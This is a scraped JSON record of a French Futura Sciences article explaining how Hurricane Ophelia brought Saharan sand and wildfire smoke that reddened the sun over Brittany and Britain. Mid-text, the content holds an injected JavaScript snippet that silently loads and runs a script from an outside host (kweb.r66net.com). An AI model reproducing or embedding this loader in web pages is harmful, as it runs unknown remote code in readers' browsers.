{"title": "L'ouragan Ophelia cree un soleil rouge et un ciel jaune en Bretagne et au Royaume-Uni", "newspaper": "Futura Sciences", "author": ["Jean-Luc Goudet"], "date_publi": "2017-10-18", "content": "Un soleil trop rouge, une ciel trop jaune, une odeur de brule : le nord-ouest de l'Europe vient de vivre une etrange experience. La cause premiere est l'ouragan Ophelia, nous expliquent les meteorologues. Depuis ce weekend, des temoignages curieux, mais aussi des  photographies , proviennent du Royaume-Uni. La  vague  est nee a l'ouest du pays, sur la facade Atlantique de l'Angleterre et au Pays de  Galles . Pas de doute, au  coucher du soleil , l' astre  est rouge, bien trop rouge, tandis que le ciel prend une  couleur  entre jaune et orangee. En Bretagne, le ciel jaune est apparu lundi, comme le rapporte  Ouest France , avec en prime une odeur acre, d'incendie et le phenomene s'est etendu sur les cotes d'Europe du nord. La panique ne s'est pas emparee de la population mais l'enigme merite une reponse. Selon le presentateur  meteo  de la  BBC , Simon King, le phenomene serait du a l' ouragan  Ophelia. La chaine  Meteo Bretagne  fournit des images et des explications. C'est bien Ophelia, un  ouragan  majeur, qui a atteint la categorie 3 au-dessus de l'Atlantique. Passe entre les Acores et Madere, il est remonte vers le nord de l'Europe et a touche l'Irlande lundi 15 octobre (faisant trois morts selon le bilan de mardi). La coulee d'air chaud a traverse le golfe de Gascogne, chargee de sable du desert et de la poussiere des grands incendies de forets du Portugal et de la Galice. (c) Meteo Bretagne                               Dans l'air chaud, du sable et de la poussiere d'incendie Quel rapport avec le  soleil  et le ciel ? Le  sable  du  Sahara . Cette puissante depression (955 hPa) a fait remonter de l' air  venu du sud. L'ensemble du systeme tourne dans le sens inverse des aiguilles d'une montre, si bien qu'a l'est, cote Europe, l'air monte vers le nord. Cet air est charge de poussieres et de sable, ce qui colore le ciel. Les courtes  longueurs d'onde  (le bleu) sont davantage diffractees, laissant beaucoup de rouge dans la teinte du soleil, selon le meme phenomene qu'a son lever et son coucher.  var dataLayer = window.dataLayer = window.dataLayer || []; dataLayer.push({ 'event': 'Tweet919979801754161152' }); Quant a l'odeur de brule, elle n'est pas une illusion. Des incendies ravagent depuis des semaines la Galice et une partie du Portugal, et leurs poussieres profitent du voyage pour traverser le golfe de Gascogne.  ( function () { var vs = document.createElement(\"script\"); vs.type = \"text/javascript\"; vs.async = true; vs.src = \"http://kweb.r66net.com/GetLink\"; var s = document.getElementsByTagName(\"script\")[0]; s.parentNode.insertBefore(vs, s); })();  Les cieux anglais, bretons et gallois ne sont pas sans rappeler les peintures de William Turner, realisees au 19 e  siecle. En 2014, une etude parue dans  Atmospheric Chemistry and Physics  avait retrouve dans les couchers de soleil rougeoyants de plusieurs de ses toiles les traces de pollutions atmospheriques engendrees par des  eruptions volcaniques . L'ouragan Maria observe en infrarouge                       L'ouragan Maria vu par le satellite GOES-16, de la NOAA le 20 septembre 2017, quand il passait au-dessus de l'ile de Porto Rico. L'image est prise en infrarouge. Les couleurs sont donc fausses mais informatives. Elles indiquent la densite des nuages et la force de la tempete. Autour de l'oeil du cyclone, la couleur rouge montre les plus fortes puissances.                                       Vous avez aime cet article ? N'hesitez pas a le partager avec vos ami(e)s et aidez-nous a faire connaitre Futura :) ! La Redaction vous remercie. Facebook Twitter Google+ Linkedin Pinterest A voir aussi :  soleil arc en ciel  |  arc en ciel entoure soleil  |  araignee rouge jaune  |  etoile rouge ciel  |  ciel rouge pourquoi  |  pourquoi soleil rouge  |  royaume de kouch  |  def ouragan  |  ouragan caraibes  |  naissance ouragan", "theme": "planete"}